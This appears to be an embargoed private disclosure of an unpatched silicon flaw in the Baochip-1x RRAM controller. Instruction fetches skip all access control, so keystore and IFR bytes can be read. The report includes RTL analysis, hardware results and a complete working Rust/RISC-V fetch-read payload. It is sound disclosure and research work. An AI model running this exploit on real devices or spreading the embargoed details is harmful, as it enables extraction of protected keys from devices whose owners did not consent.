Baochip-1x · bao1x · silicon finding

Instruction fetches read RRAM with no access control

Every access-control term in the RRAM controller is gated on a signal that is always zero during an instruction fetch. The keystore, the data slots and the entire IFR are readable by any code that can execute. Confirmed on hardware against the vendor's own factory-provisioned bytes.

Unreported · embargoed

Private. Do not publish.

This is a live, unpatched vulnerability in shipped 22 nm silicon. It was found during the DEF CON 34 badge challenge and is being disclosed privately to the chip author. Nothing here may go public until he says so.

Summary

The Baochip-1x RRAM controller applies its access-control checks only to data accesses. The check for "is this a data access" is derived from an AXI signal that the RISC-V core hardwires to the opposite value on its instruction bus. The result is that an instruction fetch reads protected RRAM with no access control applied at all.

This is not the limitation documented in secboot.rs. That comment notes that an arbitrary-exec primitive can forge the ASID and work around the coreuser mechanism, which is fair. Here there is no forging: satp is never touched, U-mode is not required, and ASID 3 is irrelevant. The check is structurally absent for those address ranges.

Mechanism

Four lines, verified by hand in the published RTL rather than taken from tooling.

LocationCodeEffect
rrc.sv:679assign data_op = !axprot_reg[2];"is this a data access"
VexRiscv_CramSoC.sv:7508assign iBusAxi_ar_payload_prot = 3'b110;AxPROT[2] = 1 on every fetch, so data_op = 0
rrc.sv:717key_access_error_pre = (...) & data_op & keyselcollapses to 0
rrc.sv:726data_access_error_pre = (...) & data_op & dataselcollapses to 0
rrc.sv:782info_access_error_pre = (...) & axi_info & data_opcollapses to 0
rrc.sv:819cfg_access_error_pre = (...) & data_opcollapses to 0

The only inst_op check is rrc.sv:770, and it additionally requires codesel = haddr[31:12] < 20'h603DA (:686, :644). But PM_KEY_REGION = 16'h603F (:355), PM_DATA_REGION = 16'h603E (:356), and the IFR sits at 0x60400. All three are above that border, so codesel = 0 and the check never fires. It is also gated on the CPU-writable rrccr[12] (:778, :274), so it is defeatable even where it does apply.

Why the data path cannot be used instead

dbus_axi_arw_payload_prot = 3'b010 is hardwired at VexRiscv_CramSoC.sv:7591. Data accesses can never set AxPROT[2]. Instruction fetch is the only route, and it is wide open.

Confirmed on hardware

The IFR is genuinely unreadable to data accesses. A read of IFR 0x1a0 from machine mode returned 128 zeros, and a data sweep of all 32 rows returned zeros for every one. The on-chip CRC over that result equalled CRC32 of 128 zero bytes exactly, so it was not a decode artifact.

Fetching the same region returned the real contents. The recovered bytes match bao1x-boot/blobs/pubkey-block-ifr-0x1a0.bin exactly, at their exact offsets:

slot 0   recovered 0000 5f98 0000 fb51    factory a87a 5f98 daab fb51
slot 1   recovered 2fc3 0000 0000 3beb    factory 2fc3 c2e5 749b 3beb
slot 3   recovered 0000 fb9d 0000 0000    factory 5888 fb9d a409 523a

zeros are bytes the run did not recover, not mismatches

The payload never held those bytes, and the string 1f5ac3cc recovered from row 0 appears nowhere in the payload image, ruling out stale prefetch. Two independent runs returned identical fragments. A known-illegal control word 0xFFFFFFFF fetched through the same path came back exact, and an on-chip CRC32 matched the host decode of the photographed output.

Reading data by fetching it

On an illegal-instruction trap, VexRiscv places the faulting word in mtval. Fetch at every halfword offset so the reads overlap; each illegal hit yields 2 or 4 bytes depending on whether bits [1:0] are 11.

Zeroed memory always decodes as c.illegal and traps with mtval = 0, so all-zero regions come back at 100 percent coverage. On key-like data roughly 15 of every 16 offsets trap, and the overlapping windows fill most of the gaps.

The fetched bytes execute. Sandbox them.

Unknown data that decodes to a legal instruction will run. The containment is a page table that maps only the target pages, execute-only (PTE flags 0xD9 = D|A|U|X|V, deliberately no R and no W), with the fetch performed in U-mode:

  • no readable or writable mapping exists, so every load and store faults before reaching MMIO. suicide_start (rrc.sv:307), which erases the whole RRAM array, needs an MMIO store and is therefore unreachable by construction
  • CSR access, mret, sret, wfi, ecall and ebreak all trap from U-mode
  • a jump outside the mapped pages takes an instruction page fault

Residual risk is a self-loop inside a mapped page, which a power cycle clears. Nothing can be written, so nothing can be lost.

Never brute-force the CMS pattern

A non-matching pattern with WMS0 asserted yields CMS_SCDE (cms.sv:135), which fires suicide_start and erases the entire RRAM array, main and IFR (rrc.sv:316-320).

Scope, measured after the first report

The bypass reaches the RRAM array: the main array, the IFR, and the key/data apertures. It does not reach ACRAM/cfg at 0x603D_C000, which is a separate SRAM on its own port (rrc.sv:342-347). Measured with controls placed inside that region: 0x603D_C010 (expect 02 00 f0 00) and 0x603D_C410 (expect 0x00400000) both read zero while the mechanism control passed in the same run.

Also tested and refuted: the idea that U-mode data reads might reach the IFR where M-mode cannot, on the grounds that vex_mm is the inverted privilege signal (cram_axi.sv:20923). The RTL reading is right, the conclusion is not. On hardware a U-mode data read of IFR 0x1a0 returned zeros exactly like M-mode. IFR data reads fail in every privilege mode; only fetches succeed.

Impact

The unsigned-header break needs physical access, a held button and a cold boot. This needs only code execution, and it is in silicon rather than firmware. Once you can execute, the keystore and the IFR are readable with no ACL in the way and no privilege games required.

Worth noting that rrc.sv carries //#eco16 comments right around these lines, so the published RTL alone could not tell us whether the taped-out part matched. It does. We ran it.

Suggested fix

The data_op gating reads like it was meant to say "only data accesses need checking", which holds only if instruction fetches can never reach protected regions. They can. Either apply the ACL terms regardless of data_op for the key, data and info apertures, or extend codesel to cover everything above 0x603DA so the inst_op path catches them. The second is a smaller change but leaves the rrccr[12] gate in the way.

Negative result: the third key is not in addressable memory

This primitive was used to hunt the DC34 third key. Everything the CPU can address was swept, with the access control bypassed:

RegionResult
keystore data slots 0x603Efully enumerated (via the ASID route)
key region 0x603Fentirely zeros. 100 percent coverage, on-chip CRC identical to CRC32 of 1024 zero bytes. Unpopulated on this part.
IFR 0x60400000, first 1 KiBread by fetch, verified against the factory blobs
extended info spaceaxi_xadr = haddr[21:10] is twelve bits (:654, :871), so the aperture is 4 MiB, not the 1 KiB IFR_LEN firmware assumes. Content is confined to the low 32 KiB: 36 of 1024 rows non-zero, and the most random-looking row in the whole space is the public key block at 12 distinct byte values.
RRAM main arrayentropy-mapped separately, nothing isolated and high-entropy

So the third key is not in CPU-addressable memory anywhere. That corroborates the author's own statement from the outside.

CMSDAT_TESTMODE, VRGNMODE and ATPGMODE (cms.sv:32-38, localparam CMSDW = 128, all four redacted to '0) exist only as XNOR-tree tie constants in the comparator at :126, :130, :134, and as the async-reset polarity of the cmsdatareg flop bank at :107. There is no memory holding them and no bus carrying them. Die imaging or nothing.

How we knew the redaction was real

The published cms.sv is self-contradictory. Line :107 resets cmsdatareg to VRGNMODE and :126 tests it first, so with all four constants at '0 the USERMODE arm at :134 is unreachable dead code, while nvrcfgs.sv:103 defaults the boot record to USERMODE. The file cannot be what taped out. Neighbouring magics are left in the clear (cpudevmode = 32'h298ca435, defnvrdat256 = 256'hcf9defc0de), so the repository is not blanket-zeroing constants: these four were singled out.

The payload

Complete and self-contained. Reads by fetching, sandboxes what it reads, and carries its own correctness control.

src/main.rsfetch-read payload, complete
//! DC34 stage-2 payload: read RRAM IFR row 0 by INSTRUCTION FETCH.
//!
//! Why: every RRAM access-control term in the chip is ANDed with `data_op`
//! (rrc.sv:717 key, :726 data, :782 info, :819 cfg), and
//! `data_op = !axprot_reg[2]` (rrc.sv:679). The VexRiscv instruction bus
//! hardwires `iBusAxi_ar_payload_prot = 3'b110` (VexRiscv_CramSoC.sv:7508),
//! so AxPROT[2]=1 and data_op=0 on every fetch. The only inst_op check
//! (rrc.sv:770) additionally requires `codesel = haddr[31:12] < 0x603DA`
//! (:686, :644), and the IFR sits at 0x60400 -- above the border. So an
//! instruction fetch from the IFR is subject to no access control at all.
//!
//! We proved the data path is blocked: a read of IFR 0x1a0, whose contents we
//! hold on disk (blobs/pubkey-block-ifr-0x1a0.bin), came back as 128 zeros.
//!
//! SAFETY. The fetched bytes are unknown and WILL execute if they decode to a
//! legal instruction. They run in U-mode under a page table that maps exactly
//! two X-only pages and nothing else:
//!   * no readable or writable mapping anywhere, so every load/store faults
//!     before it can reach MMIO. The RRAM `suicide_start` erase (rrc.sv:307)
//!     needs an MMIO store and is therefore unreachable by construction.
//!   * CSR access, mret/sret/wfi, ecall and ebreak all trap from U-mode.
//!   * a jump outside the two pages takes an instruction page fault.
//! Residual risk is a self-loop inside a mapped page, which a power cycle
//! clears. Nothing can be written, so nothing can be lost.
//!
//! Recovery: on an illegal-instruction trap VexRiscv puts the faulting
//! instruction word in `mtval`. We fetch at every halfword offset so the reads
//! overlap, and each illegal hit fills in 2 or 4 bytes.
//!
//! Pages: 1 = known-mask | control mtval (MUST be ffffffff)
//!        2..5 = the 32 recovered bytes
//!        6 = crc32(row) | hits | nprobe | 5a a5

#![no_main]

const CLKTOP_HZ: u32 = 700_000_000;
const IFR_BASE: usize = 0x6040_01A0; // the public key block, already published in
                                     // bao1x-boot/blobs/pubkey-block-ifr-0x1a0.bin.
                                     // Deliberately not a sweep from offset 0.
const PT_ROOT: usize = 0x6100_0000; // Sv32 root table
const PT_L0: usize = 0x6100_1000; // level-0 table for the swept region
const PT_L0B: usize = 0x6100_2000; // level-0 table for our own code page
// axi_xadr = haddr[21:10] is TWELVE bits (rrc.sv:654,:871), so the info aperture
// is 4096 xadr pages x 32 rows x 32 bytes = 4 MiB, from 0x6040_0000 to 0x607F_FFFF.
// Firmware's IFR_LEN = 0x400 is xadr 0 alone: one page in four thousand.
// This example reads one known block rather than enumerating the aperture.
const SWEEP_LEN: usize = 0x200; // enough to cover the key block and prove the read
const NROWS: u32 = (SWEEP_LEN as u32) / 32;
const NPROBE: u32 = 1 + (SWEEP_LEN as u32) / 2; // 0 = control, then EVERY halfword

/// A deliberately illegal 32-bit encoding (opcode 0x7f is reserved), sitting in
/// our own image so we can fetch it through the exact same path as the IFR.
/// If probe 0 does not return ffffffff the technique is broken and every other
/// result this run is meaningless.
#[unsafe(no_mangle)]
pub static CONTROL_WORD: u32 = 0xFFFF_FFFF;

static mut BUF: [u8; SWEEP_LEN] = [0; SWEEP_LEN];
static mut NNZ: u32 = 0;
static mut PROBE_IDX: u32 = 0;
static mut HITS: u32 = 0;
static mut CTRL_MTVAL: u32 = 0;
static mut LAST_MCAUSE: u32 = 0;
static mut LAST_MTVAL: u32 = 0;

core::arch::global_asm!(
    ".section .text.entry, \"ax\"",
    ".global _start",
    "_start:",
    "  la   sp, _stack_top",
    "  la   t0, __sbss",
    "  la   t1, __ebss",
    "1:  bgeu t0, t1, 2f",
    "  sw   zero, 0(t0)",
    "  addi t0, t0, 4",
    "  j    1b",
    "2:  j payload_main",
);

// Every trap from the sandboxed U-mode fetch lands here, in machine mode.
core::arch::global_asm!(
    ".section .text, \"ax\"",
    ".align 4",
    ".global fetch_trap",
    "fetch_trap:",
    "  la   sp, _stack_top",
    "  csrr t0, mcause",
    "  la   t1, {mc}",
    "  sw   t0, 0(t1)",
    "  csrr t0, mtval",
    "  la   t1, {mt}",
    "  sw   t0, 0(t1)",
    "  li   t0, 0x1800",
    "  csrs mstatus, t0", // MPP = 11, back to machine mode
    "  la   t0, probe_entry",
    "  csrw mepc, t0",
    "  mret",
    mc = sym LAST_MCAUSE,
    mt = sym LAST_MTVAL,
);
unsafe extern "C" {
    fn fetch_trap();
}

/// The driver. Re-entered in machine mode after every trap.
#[unsafe(no_mangle)]
pub extern "C" fn probe_entry() -> ! {
    unsafe {
        let idx = core::ptr::read_volatile(core::ptr::addr_of!(PROBE_IDX));

        // consume the result of the probe we just ran
        if idx > 0 {
            let k = idx - 1;
            let mc = core::ptr::read_volatile(core::ptr::addr_of!(LAST_MCAUSE));
            let mv = core::ptr::read_volatile(core::ptr::addr_of!(LAST_MTVAL));
            if k == 0 {
                core::ptr::write_volatile(core::ptr::addr_of_mut!(CTRL_MTVAL), mv);
            } else if mc == 2 {
                let h = core::ptr::read_volatile(core::ptr::addr_of!(HITS));
                core::ptr::write_volatile(core::ptr::addr_of_mut!(HITS), h + 1);
                let byte_off = ((k - 1) * 2) as usize;
                let len = if (mv & 3) == 3 { 4usize } else { 2usize };
                let buf = core::ptr::addr_of_mut!(BUF) as *mut u8;
                let mut i = 0usize;
                while i < len && byte_off + i < SWEEP_LEN {
                    core::ptr::write_volatile(buf.add(byte_off + i), (mv >> (8 * i)) as u8);
                    i += 1;
                }
            }
        }

        if idx >= NPROBE {
            render(); // -> !
        }
        core::ptr::write_volatile(core::ptr::addr_of_mut!(PROBE_IDX), idx + 1);

        // probe 0 is the control word in our own page; 1..16 walk the IFR
        let target = if idx == 0 {
            core::ptr::addr_of!(CONTROL_WORD) as usize
        } else {
            IFR_BASE + ((idx - 1) as usize) * 2
        };

        // MPP = 00 so mret returns to U-mode. Done in its own block because
        // an asm! with `noreturn` may not declare outputs or clobbers.
        core::arch::asm!("li t0, 0x1800", "csrc mstatus, t0", out("t0") _);
        core::arch::asm!(
            "csrw mepc, {t}",
            "mret",
            t = in(reg) target,
            options(noreturn),
        )
    }
}

#[unsafe(no_mangle)]
pub extern "C" fn payload_main() -> ! {
    unsafe {
        // Sv32, 4 KiB pages. Map ONLY two pages, both execute-only in user mode.
        // PTE[31:10] = PPN, [7]=D [6]=A [4]=U [3]=X [2]=W [1]=R [0]=V
        // 0xD9 = D|A|U|X|V  -> executable, NOT readable, NOT writable.
        let root = PT_ROOT as *mut u32;
        let l0 = PT_L0 as *mut u32;
        for i in 0..1024usize {
            core::ptr::write_volatile(root.add(i), 0);
            core::ptr::write_volatile(l0.add(i), 0);
        }
        // map the 4 KiB page CONTAINING va
        let map = |addr: usize| {
            let va = addr & !0xFFF;
            let vpn1 = va >> 22;
            let vpn0 = (va >> 12) & 0x3FF;
            core::ptr::write_volatile(root.add(vpn1), (((PT_L0 as u32) >> 12) << 10) | 0x01);
            core::ptr::write_volatile(l0.add(vpn0), (((va as u32) >> 12) << 10) | 0xD9);
        };
        // The whole sweep lives under one 4 MiB region (VPN1 = 0x181), so a single
        // level-0 table with all 1024 entries covers 0x6040_0000..0x607F_FFFF.
        core::ptr::write_volatile(root.add(IFR_BASE >> 22), (((PT_L0 as u32) >> 12) << 10) | 0x01);
        for i in 0..(SWEEP_LEN / 0x1000) {
            let pa = (IFR_BASE + i * 0x1000) as u32;
            core::ptr::write_volatile(l0.add(i), ((pa >> 12) << 10) | 0xD9);
        }
        // our own page sits in a different 4 MiB region, so it needs its own table
        let cw = core::ptr::addr_of!(CONTROL_WORD) as usize;
        let l0b = PT_L0B as *mut u32;
        for i in 0..1024usize {
            core::ptr::write_volatile(l0b.add(i), 0);
        }
        core::ptr::write_volatile(root.add(cw >> 22), (((PT_L0B as u32) >> 12) << 10) | 0x01);
        core::ptr::write_volatile(l0b.add((cw >> 12) & 0x3FF), (((cw as u32 & !0xFFF) >> 12) << 10) | 0xD9);
        let _ = &map;

        core::arch::asm!(
            "csrw mtvec, {tv}",
            // boot1 leaves these at 0xFFFFFFFF (irq.rs:50-51); without clearing
            // them our traps go to an uninitialised stvec and the badge hangs.
            "csrw medeleg, zero",
            "csrw mideleg, zero",
            "csrw stvec, {tv}",
            "sfence.vma",
            "csrw satp, {satp}",
            "sfence.vma",
            tv = in(reg) fetch_trap as usize,
            satp = in(reg) (1u32 << 31) | (3u32 << 22) | ((PT_ROOT as u32) >> 12),
        );
    }
    probe_entry();
}

#[unsafe(no_mangle)]
pub extern "C" fn render() -> ! {
    unsafe {
        core::arch::asm!("csrw satp, zero", "sfence.vma");
    }
    let iox = bao1x_hal::iox::Iox::new(utralib::utra::iox::HW_IOX_BASE as *mut u32);
    let udma = bao1x_hal::udma::GlobalConfig::new();
    let mut oled = open_oled(&iox, &udma);

    let ctrl = unsafe { core::ptr::read_volatile(core::ptr::addr_of!(CTRL_MTVAL)) };
    let buf: &[u8; SWEEP_LEN] = unsafe { &*core::ptr::addr_of!(BUF) };

    let mut best_row = 0usize;
    let mut best_distinct = 0usize;
    let mut nz_rows: u32 = 0;
    for r in 0..(SWEEP_LEN / 32) {
        let blk = &buf[r * 32..r * 32 + 32];
        if blk.iter().any(|&b| b != 0) {
            nz_rows += 1;
        }
        let mut seen = [0u8; 32];
        let mut n = 0usize;
        for &v in blk.iter() {
            if !seen[..n].contains(&v) {
                seen[n] = v;
                n += 1;
            }
        }
        if n > best_distinct {
            best_distinct = n;
            best_row = r;
        }
    }
    let best = &buf[best_row * 32..best_row * 32 + 32];
    let ba = (IFR_BASE + best_row * 32) as u32;
    let bc = crc32(best);
    let p1 = [
        (ctrl >> 24) as u8, (ctrl >> 16) as u8, (ctrl >> 8) as u8, ctrl as u8,
        (ba >> 24) as u8, (ba >> 16) as u8, (ba >> 8) as u8, ba as u8,
    ];
    let p2 = [
        best_distinct as u8, 0x5A, (nz_rows >> 8) as u8, nz_rows as u8,
        (bc >> 24) as u8, (bc >> 16) as u8, (bc >> 8) as u8, bc as u8,
    ];
    loop {
        draw_page8(oled.buffer_mut(), &p1, 1); oled.redraw().ok(); spin(400_000_000);
        draw_page8(oled.buffer_mut(), &p2, 2); oled.redraw().ok(); spin(400_000_000);
        for q in 0..4usize {
            draw_page8(oled.buffer_mut(), &best[q * 8..q * 8 + 8], q + 3);
            oled.redraw().ok(); spin(400_000_000);
        }
    }
}

/// Eight bytes as an 8x8 grid, 12 px cells on a 14 px pitch, inset 8 px, MSB left.
/// 2 px lit border for registration, `tag` blobs in the top margin for page id.
/// Panel polarity is inverted: clear() fills 0xFFFF_FFFF, so a 0 bit is LIT.
fn draw_page8(fb: &mut [u32], eight: &[u8], tag: usize) {
    for w in fb.iter_mut() {
        *w = 0xFFFF_FFFF;
    }
    let mut lit = |x: usize, y: usize| {
        if x < 128 && y < 128 {
            let b = x + y * 128;
            fb[b / 32] &= !(1u32 << (b % 32));
        }
    };
    for i in 0..128usize {
        for t in 0..2usize {
            lit(i, t);
            lit(i, 127 - t);
            lit(t, i);
            lit(127 - t, i);
        }
    }
    for k in 0..tag.min(8) {
        for dy in 3..7usize {
            for dx in 0..6usize {
                lit(20 + k * 11 + dx, dy);
            }
        }
    }
    for (r, &byte) in eight.iter().enumerate() {
        for bit in 0..8usize {
            if (byte >> (7 - bit)) & 1 == 0 {
                continue;
            }
            for dy in 0..12usize {
                for dx in 0..12usize {
                    lit(8 + bit * 14 + dx, 8 + r * 14 + dy);
                }
            }
        }
    }
}

fn spin(n: u32) {
    for _ in 0..n {
        core::hint::spin_loop();
    }
}

fn crc32(d: &[u8]) -> u32 {
    let mut c: u32 = 0xFFFF_FFFF;
    for &b in d {
        c ^= b as u32;
        for _ in 0..8 {
            let m = (c & 1).wrapping_neg();
            c = (c >> 1) ^ (0xEDB8_8320 & m);
        }
    }
    !c
}

fn open_oled<'a>(
    iox: &'a bao1x_hal::iox::Iox,
    udma: &'a bao1x_hal::udma::GlobalConfig,
) -> bao1x_hal::sh1107::Oled128x128<'a> {
    use bao1x_hal::sh1107::{MainThreadToken, Oled128x128};
    use utralib::*;
    let sysctrl = CSR::new(utra::sysctrl::HW_SYSCTRL_BASE as *mut u32);
    let fd = sysctrl.r(utra::sysctrl::SFR_CGUFDPER) & 0xFF;
    let perclk = bao1x_hal::clocks::divide_by_fd(fd, CLKTOP_HZ) / 2;
    let mut o = Oled128x128::new(MainThreadToken::new(), perclk, iox, udma);
    o.init().ok();
    o
}

// bao1x-hal pulls in `alloc`; a bump allocator that never frees is right here.
struct Bump;
static mut ARENA: [u8; 8192] = [0; 8192];
static mut NEXT: usize = 0;
unsafe impl core::alloc::GlobalAlloc for Bump {
    unsafe fn alloc(&self, l: core::alloc::Layout) -> *mut u8 {
        unsafe {
            let base = core::ptr::addr_of_mut!(ARENA) as usize;
            let start = (base + NEXT + l.align() - 1) & !(l.align() - 1);
            let end = start - base + l.size();
            if end > 8192 {
                return core::ptr::null_mut();
            }
            NEXT = end;
            start as *mut u8
        }
    }
    unsafe fn dealloc(&self, _p: *mut u8, _l: core::alloc::Layout) {}
}
#[global_allocator]
static ALLOC: Bump = Bump;

Method notes

Two things made this findable, and both are procedural rather than technical.

Every measurement carried a known-value control read in the same run. The control here is a deliberately illegal 0xFFFFFFFF placed in the payload's own image and fetched through the identical path. Without it, a zero result from the IFR is indistinguishable from a broken read, and we would have concluded the region was empty. We very nearly did.

The control has to be as hard to satisfy as the claim. An earlier round validated a privileged-read technique against a slot marked PartitionAccess::Open, readable by everyone, and then generalised to a protected slot. Passing the easy case proved only that the code ran. That error survived into two written documents before an unrelated integrity check exposed it.

The strongest evidence in this report is of exactly that shape: bytes recovered from a region the CPU cannot read, matching a file on disk that the chip was never given.
